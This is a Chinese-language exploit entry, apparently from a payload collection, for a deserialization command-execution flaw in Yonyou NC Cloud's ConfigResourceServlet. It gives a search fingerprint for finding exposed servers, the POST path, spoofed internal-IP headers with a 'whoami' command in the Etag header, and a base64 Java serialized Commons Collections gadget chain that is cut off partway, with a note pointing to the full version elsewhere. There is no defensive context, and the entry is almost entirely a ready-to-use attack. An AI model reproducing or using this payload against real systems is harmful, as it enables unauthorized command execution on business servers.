# 用友-NC-Cloud-ConfigResourceServlet存在反序列化漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/Client/Uclient/UClient.exe"`
- **请求**：`POST /servlet/~ic/nc.bs.framework.server.ConfigResourceServlet HTTP/1.1`
- **关键头**：`Etag: whoami`　`X-Forwarded-For: 127.0.0.10`　`X-Originating-IP: 127.0.0.10`　`X-Remote-Addr: 127.0.0.10`　`X-Remote-IP: 127.0.0.10`

**请求体 / payload**
```
{{base64dec(rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQABHN1MThzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xv…（脚本共 7211 字，完整版见原文）
```